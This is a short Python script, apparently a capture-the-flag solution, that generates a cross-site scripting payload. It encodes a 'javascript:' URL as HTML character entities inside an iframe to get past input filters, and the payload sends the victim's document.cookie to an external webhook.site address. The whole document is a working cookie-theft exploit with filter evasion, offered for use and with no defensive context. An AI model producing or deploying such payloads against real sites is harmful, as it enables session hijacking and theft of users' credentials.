

_link='https://webhook.site/2170c7c8-949c-41d1-8479-5d10a976084e'
content = "javascript:fetch('%s?flag='+document.cookie).then((response) => {return response.json();}).catch((error) => {console.log('no');})"%_link
result = "<iframe src=&#"
for i in content:
    result+=str(ord(i))#convert 2 ascii
    result+=";&#"
result = result[:-3]+"><iframe>"
print(result)
